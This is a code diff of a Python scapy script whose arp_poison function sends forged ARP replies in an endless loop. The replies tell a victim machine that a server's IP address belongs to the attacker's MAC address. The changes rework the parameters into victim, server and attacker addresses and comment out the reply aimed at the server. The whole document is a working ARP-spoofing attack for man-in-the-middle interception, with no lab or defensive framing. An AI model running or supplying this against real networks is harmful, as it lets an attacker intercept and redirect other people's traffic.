@@ -1,20 +1,15 @@
-from scapy.all import ARP, Ether, sendp, get_if_hwaddr
+from scapy.all import *
 import time
 
-def arp_poison(target_ip, gateway_ip, interface):
-    mac = get_if_hwaddr(interface)
+def arp_poison(ipVictim, macVictim, ipServer, macServer, ipAttacker, macAttacker, interface):
 
-    # Create an ARP response packet for the target machine
-    arp_response_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=mac)
-    
-    # Create an ARP response packet for the gateway machine
-    arp_response_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=mac)
+    arp_response_victim = ARP(op=2, pdst=ipVictim, hwdst=macVictim, psrc=ipServer, hwsrc=macAttacker)
+    #arp_response_server = ARP(op=2, pdst=ipVictim, hwdst=macVictim, psrc=ipServer, hwsrc=macAttacker)
 
-    # Continually send the ARP response packets
     while True:
         try:
-            sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/arp_response_target, iface=interface, verbose=False)
-            sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/arp_response_gateway, iface=interface, verbose=False)
+            sendp(Ether(src=macAttacker, dst="ff:ff:ff:ff:ff:ff")/arp_response_victim, iface=interface, verbose=False)
+            #sendp(Ether(src=macAttacker, dst="ff:ff:ff:ff:ff:ff")/arp_response_server, iface=interface, verbose=False)
             time.sleep(5)
         except KeyboardInterrupt:
             break
